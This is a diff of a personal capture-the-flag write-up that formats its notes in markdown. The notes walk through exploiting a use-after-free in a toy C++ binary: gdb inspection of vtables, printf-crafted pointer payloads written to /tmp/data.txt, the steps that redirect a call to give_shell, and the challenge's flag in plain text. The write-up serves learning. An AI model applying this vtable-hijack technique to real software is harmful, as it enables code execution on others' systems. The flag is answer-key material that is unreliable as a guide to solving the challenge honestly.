@@ -38,7 +38,7 @@ cd /tmp
 - AMAZING! Now I have symbols!
 
 - Using printf I can write bytes into file:
-printf "%b" '\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11' >> /tmp/data.txt
+`printf "%b" '\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11' >> /tmp/data.txt`
 
 - You can add a break point using line number!
 "b uaf.cpp:55"
@@ -48,22 +48,24 @@ I couldn't make the malloc of my data to be the same as one of the Humans, It wa
 
 - AHAH!!!! I did it! (it was pretty fast - took me a few seconds). I figured that if the size is right, then using malloc again might return the man's pointer - which it did ;) Now I only need a shellcode that points to the give_shell function and I won.
 
-- Using "info address Human::give_shell" I found out the address is 0x4012ea
+- Using `info address Human::give_shell` I found out the address is 0x4012ea
 
-- Using "x/10a *(void**)m" I can see the vtable (virtual table) of Human and the address
+- Using `x/10a *(void**)m"` I can see the vtable (virtual table) of Human and the address
 
 - Well, now it worked well, but I got a seg fault (of course). I was doing all sorts of things to understand how to make it work - but I figured that I need to dig into the assembly - see exactly where I fail. I used "x/i 0x0000000000401149" and saw that the problem is in this line:
-mov    (%rax),%rax
+`mov    (%rax),%rax`
 
 I believe that it's part of the function call, and "rax" should have the function address. Using "p/x $rax" I read rax value and found this: 0x4444333322221119
 It's great! the values I used are 0x4444333322221111. One assembly line before the address is added 8. The code crashes because that address is invalid, but if I will manage to put the right address then I can make it!
 
 - In order to edit the file with hex editor I used vim and ":%!xxd", to exit it I used ":%!xxd -r"
 
-- Using !printf "%b" '\x00\xe2\x12\x40\x00\x00\x00\x00' > /tmp/data.txt
+- Using `!printf "%b" '\x00\xe2\x12\x40\x00\x00\x00\x00' > /tmp/data.txt`
 I can manage to inject the address pretty well (took me some time to get the big/small indian thing there). The problem is actully 3 assembly lines before the call. The code is this line:
+```
 add    $0x8,%eax
 adding 0x8 to eax (not rax!)
+```
 
 I was trying to figure out what address will resolve in 0x4012ea after this line and I just can't make it. I'll take some time off, I am sure I can make it work! 
 
@@ -71,8 +73,8 @@ I was trying to figure out what address will resolve in 0x4012ea after this line
 I had an idea. If I can use a breakpoint on the line before the add, and after the add "in the wild" - without my payload, I can see the diff. I found out that the address
 
 So in the wild the values are as following:
-before: 0x401668 (dec: 4200040)
-after:  0x401670 (dec: 4200048)
+`before: 0x401668 (dec: 4200040)`
+`after:  0x401670 (dec: 4200048)`
 
 If I will take my address: 0x4012ea (dec: 4199146), substruct 8 and we get 0x4012e2 (dec: 4199138)
 
@@ -81,32 +83,35 @@ If I will take my address: 0x4012ea (dec: 4199146), substruct 8 and we get 0x401
 
 - I made itttt! Using trial and error, I understood that the thing that is messing me up is that when adding the 8 I get another digit in my hex value. So I tried using a payload with all 0's, and slowly adding numbers until I can get it to work! The shellcode I cameup with was this:
 
-!printf "%b" '\xe2\x12\x40\x00\x00\x00\x00\x00' > /tmp/data.txt
+`!printf "%b" '\xe2\x12\x40\x00\x00\x00\x00\x00' > /tmp/data.txt`
 When adding 0x8 to that data, we get the 0x4012ea address 
 
 - Andd still seg fault. Let's see what happends in the wild.
 
-- I set a break point as following "x/i 0x401153".
+- I set a break point as following `x/i 0x401153`.
 reading rax leads to 0x40144a - looked into the vtable of m and this is acctualy the address of Man::introduce. I am VERY close. There are a few more other stuff happening before the function call, and my address is probably not good. Let's check.
 
 - I looked into what the address in the wild looks like in the line of the seg fault (0x4011)
 
-!printf "%b" '\xe2\x12\x40\x00\x00\x00\x00\x00' > /tmp/data.txt
+`!printf "%b" '\xe2\x12\x40\x00\x00\x00\x00\x00' > /tmp/data.txt`
 
 - Ok in order to make my life less misrable - I used 
 "set disassembly-flavor intel" to make the assembly easier to disassbmle
 
 - NICE! Got a lead. I saw that on the wild, rax holds some kind of value, THAT IS NOT the address where introduce is, but a POINTER to the address. So the following line comes up:
-0x0000000000401142 <+284>:   mov    rax,QWORD PTR [rax]
+`0x0000000000401142 <+284>:   mov    rax,QWORD PTR [rax]`
 
 The thing there, is that rax is changed with the value of the data inside of the pointer that rax holds.
-I did some digging, in the wild the address originaly inside of rax is 0x401670. Looking inside of this address we find: "p/x *0x401670"
+I did some digging, in the wild the address originaly inside of rax is 0x401670. Looking inside of this address we find:
+```
+p/x *0x401670
 0x40144a
+```
 This address is the introduce address!! I was looking into it and the 0x401670 address is inside the vtable
 0x401668 <_ZTV3Man+16>: 0x4012ea <Human::give_shell()>  0x40144a <Man::introduce()>
 
 If 0x401670 is introduce, then 0x401668 must be give_shell!
-I ran "p/x *0x401668" and indeed got the give_shell function value!
+I ran `p/x *0x401668` and indeed got the give_shell function value!
 Let's try it then!
 
 - YEAHHHHHHHH it work with my symboled binary!! I RAN CODE! I HAVE SHELLLLL!!
@@ -115,30 +120,34 @@ Let's try it then!
 
 
 - It's the money time, let's go!
-- Running the ./uaf 42 /tmp/data.txt
+- Running the 
+```
+./uaf 42 /tmp/data.txt
 free
 after
 after
 use!
+```
 - ANDD no. it got seg fault
 - OK I disassembled the code, used a break point in the line of "mov rax, [rax]"
 then I read the value of rax - 0x827ca0
 SOO TECHINCLY - using this address I can make my shellcode work.
 
 - In order to understand where in the code I am, I crashed my code (free, then use) - it was this line:
-=> 0x0000000000401149 <+291>:   mov    rax,QWORD PTR [rax]
+`=> 0x0000000000401149 <+291>:   mov    rax,QWORD PTR [rax]`
 
 In the original code:
-=> 0x0000000000400fd8 <+276>:   mov    rdx,QWORD PTR [rax]
+`=> 0x0000000000400fd8 <+276>:   mov    rdx,QWORD PTR [rax]`
 
 - The code in the original file is a bit diffrent, it uses the rdx register instead. I set a break point and looked inside of rax - the address was "0x401578" - let's try building a payload around it
 
 (0x401578 - 0x8 ofcourse)
-!printf "%b" '\x70\x15\x40\x00\x00\x00\x00\x00' > /tmp/data.txt
+`!printf "%b" '\x70\x15\x40\x00\x00\x00\x00\x00' > /tmp/data.txt`
 
-- Using the following payload, I managed to run introduce().
+- Using the following payload, I managed to run `introduce()`.
 
 - Ok so I did the following:
+```
 I know that in the wild the pointer is 0x401578
 
 using p/x *0x401578 I got the value 0x4012d2.
@@ -147,6 +156,7 @@ using x/i 0x4012d2 which is introduce!
 substructing 8 from this address I get 0x401570
 using p/x *0x401570 - I get 0x40117a
 using x/i 0x40117a - I get give_shell!!
+```
 
 So now let's build the payload, because there is add 0x8 before the call, I need to substruct 8 from 0x401570
 
@@ -154,23 +164,26 @@ So now let's build the payload, because there is add 0x8 before the call, I need
 
 - So let's use the following payload now.
 # Building the payload
-!printf "%b" '\x68\x15\x40\x00\x00\x00\x00\x00' > /tmp/data.txt
+`!printf "%b" '\x68\x15\x40\x00\x00\x00\x00\x00' > /tmp/data.txt`
 
+```bash
 /home/uaf/uaf 16 /tmp/data.txt
-(Running the binary - Man and Woman are malloced)
+# (Running the binary - Man and Woman are malloced)
 
 3 - free
-(The addressed allocated are now free to use)
+# (The addressed allocated are now free to use)
 
 2 - after
-(Allocating data on the old woman pointer)
+# (Allocating data on the old woman pointer)
 
 2 - after
-(Allocating data on the old man pointer)
+# (Allocating data on the old man pointer)
 1 - use
 
-(Trying to run man.introduce() - the custom crafted payload is pointing to give_shell instead)
-
+# (Trying to run man.introduce() - the custom crafted payload is pointing to give_shell instead)
+```
 - SHELL!!!!
-cat flag ;)
-flag: yay_f1ag_aft3r_pwning
+`cat flag ;)`
+
+# FLAG: yay_f1ag_aft3r_pwning
+# pwned.
